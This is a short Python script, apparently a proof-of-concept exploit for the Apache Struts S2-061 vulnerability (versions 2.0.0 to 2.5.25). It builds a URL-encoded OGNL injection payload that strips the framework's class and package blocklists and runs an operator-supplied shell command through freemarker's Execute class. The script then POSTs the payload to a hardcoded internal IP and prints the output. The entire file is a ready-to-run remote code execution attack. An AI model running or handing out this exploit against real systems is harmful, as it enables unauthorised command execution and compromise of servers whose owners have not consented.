import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0', }


def s2_061():
    # Struts 2.0.0 - 2.5.25
    cmd = input("cmd:")
    payload = '%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).' \
              '(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).' \
              '(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).' \
              '(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).' \
              '(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).' \
              '(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.' \
              'newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).' \
              '(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).' \
              '(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).' \
              '(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).' \
              '(%23cmd%3d{%27' + cmd + '%27}).(%23res%3d%23exec.exec(%23cmd))}'
    post_url = url + '\?id=' + payload
    res = requests.post(url=post_url, headers=headers)
    print(res.text)


if __name__ == '__main__':
    url = 'http://192.168.6.227:8080'
    s2_061()
